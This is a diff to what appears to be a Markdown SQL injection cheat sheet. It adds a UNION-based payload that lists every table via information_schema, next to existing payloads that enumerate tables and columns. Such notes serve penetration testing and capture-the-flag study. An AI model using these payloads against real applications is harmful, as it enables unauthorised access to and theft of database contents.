@@ -12,6 +12,12 @@ The last command dumps all databases, we'll know try to enumerate each one of th
 
 ' UNION select table\_name, NULL from information\_schema.tables where table\_schema = 'public'-- -
 
+
+
+## Listing all the tables
+
+' union select table\_name, NULL from information\_schema.tables-- -
+
 ## Listing columns:
 
 ' UNION select NULL, column\_name from information\_schema.columns where table\_schema='DB' and table\_name='table'-- -'
